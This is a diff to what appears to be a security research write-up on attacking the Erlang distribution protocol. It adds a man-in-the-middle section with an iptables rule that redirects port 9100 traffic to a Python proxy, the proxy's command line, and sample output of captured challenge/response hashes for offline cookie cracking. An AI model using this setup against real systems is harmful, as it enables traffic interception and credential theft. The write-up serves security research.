@@ -307,7 +307,21 @@ Gaining an interactive reverse shell is now a step ahead.
 
 ### Exploiting man-in-the-middle
 
-A man-in-the-middle attacker may wait for the legit client to authenticate, and then inject malicious commands into the external encoded Erlang stream, which is neither ciphered, neither authenticated. This part is still a **work in progress**.
+A man-in-the-middle attacker may wait for the legit client to authenticate, and then inject malicious commands into the external encoded Erlang stream, which is neither ciphered, neither authenticated. This part is now implemented, as a Python asyncore Erlang distribution [proxy](erldp-proxy.py). It currently identifies and outputs challenges/responses, leaving the cookie to be cracked offline.
+
+A typical setup would require to tranparently proxying Erlang distribution using an iptables rule such as:
+
+```
+# iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 9100 -j REDIRECT --to-port 19100
+```
+
+Now that trafic is locally redirected, start the transparent proxy:
+
+```
+$ ./erldp-proxy.py --lhost 0.0.0.0 --lport 19100
+client auth: md5(cookie|1607529485) = 345b10e9da6e2ff3e44fc4adf729e7f2
+server auth: md5(cookie|31337) = a64eba4101a8c42235934ae8539b09de
+```
 
 ## Recommendations
 
